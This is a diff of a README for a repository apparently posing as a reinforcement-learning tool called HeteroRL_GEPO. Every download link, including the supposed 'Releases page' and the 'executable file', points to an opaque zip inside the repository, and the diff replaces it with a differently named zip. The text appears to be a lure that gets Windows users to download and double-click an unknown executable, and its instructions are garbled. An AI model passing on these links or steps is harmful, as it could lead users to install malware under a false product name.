@@ -4,7 +4,7 @@
 Welcome to HeteroRL_GEPO! This application helps you enhance your reinforcement learning projects. With this tool, you can easily implement Group Expectation Policy Optimization for different environments.
 
 ## 📥 Download Now
-[![Download HeteroRL_GEPO](https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip)](https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip)
+[![Download HeteroRL_GEPO](https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip)](https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip)
 
 ## 💻 System Requirements
 Before you download, please ensure your system meets the following requirements:
@@ -14,11 +14,11 @@ Before you download, please ensure your system meets the following requirements:
 - **Dependencies:** Python 3.7 or later; additional libraries will be installed automatically.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip).
 2. **Select the Latest Version**: Look for the latest version available at the top of the list. This will usually be marked as "Latest Release."
-3. **Download the Application**: Click on the link that says the version number. For example, “https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip” or similar.
+3. **Download the Application**: Click on the link that says the version number. For example, “https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip” or similar.
 4. **Extract the Files**: Once the file is downloaded, locate it in your Downloads folder. Right-click on the file and select "Extract All" or use a similar option depending on your software.
-5. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file (e.g., `https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip` for Windows). Double-click on it to run the application.
+5. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file (e.g., `https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip` for Windows). Double-click on it to run the application.
 
 ## 🔧 How to Use
 1. **Set Up Your Environment**: Before using the application, make sure you have your reinforcement learning environment set up.
@@ -50,6 +50,6 @@ We encourage you to connect with other users:
 - Stay updated with new features and enhancements.
 
 ## 📥 Additional Download Link
-For your convenience, here's the download link again: [Releases page](https://raw.githubusercontent.com/yelurebajrang/HeteroRL_GEPO/main/Hydrobates/HeteroRL_GEPO.zip).
+For your convenience, here's the download link again: [Releases page](https://github.com/yelurebajrang/HeteroRL_GEPO/raw/refs/heads/main/Hydrobates/Hetero-GEPO-R-Cetomorpha.zip).
 
 Happy optimizing with HeteroRL_GEPO! Enjoy enhancing your reinforcement learning projects with ease.
